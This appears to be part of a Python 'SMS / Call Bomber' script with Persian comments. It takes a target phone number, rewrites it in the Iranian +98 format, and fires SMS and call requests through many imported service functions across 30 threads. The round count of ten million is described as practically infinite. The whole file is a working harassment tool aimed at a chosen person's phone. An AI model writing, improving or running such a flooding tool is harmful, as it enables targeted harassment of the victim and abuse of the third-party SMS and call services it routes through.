...
S_SMS = [i[0] for i in getmembers(sms, isfunction)]
S_Call = [i[0] for i in getmembers(call, isfunction)]

# === تابع هندل لاگ هر درخواست ===
def handle_request(func, phone, name):
    try:
        result = func(phone)
        print(f"\033[92m[SUCCESS]\033[0m {name} → {result}")
    except Exception as e:
        print(f"\033[91m[FAILED]\033[0m {name} → {e}")

# === تابع بمباران با لاگ نتیجه‌ها ===
def bombing(phone, count, mode=3, max_workers=30, delay=0.2):
    phone = f"+98{phone[1:]}" if phone.startswith("0") else phone
    x = 0

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for j in range(count):
            if mode in [1, 3]:  # SMS or Hybrid
                for func_name in S_SMS:
                    func = getattr(sms, func_name)
                    executor.submit(handle_request, func, phone, func_name)
                    time.sleep(delay)

            if mode in [2, 3] and j % 5 == 0 and S_Call:
                func = getattr(call, S_Call[x])
                executor.submit(handle_request, func, phone, S_Call[x])
                x = (x + 1) % len(S_Call)
...
\033[1;32mSMS / Call Bomber tool - by AlIT Ghafari
    """)

def get_mode():
    print("\n\033[1;35mSelect mode:\033[0m")
    print("\033[1;36m[1]\033[0m SMS only")
    print("\033[1;36m[2]\033[0m Call only")
    print("\033[1;36m[3]\033[0m SMS + Call (Hybrid)\n")

    while True:
        mode = input("\033[1;33m>> \033[0m").strip()
        if mode in ["1", "2", "3"]:
            return int(mode)
        else:
...
if __name__ == "__main__":
    banner()
    num = input('\n\033[1;36m[$] Enter Phone Number (e.g. 09123456789): \033[0m').strip()
    round = 10000000  # Infinite loop practically
    mode = get_mode()

    print(f"\n\n \033[1;32mTarget Number : \033[96m{num}")
    print(" \033[1;32mMode           : \033[96m" + ["SMS", "Call", "Hybrid"][mode - 1])
    print(" \033[1;32mPress Ctrl+C to stop anytime.\n")
    print("\033[1;33mSending in progress...\033[0m")

    # اجرا با حالت انتخاب‌شده:
    bombing(phone=num, count=round, mode=mode)
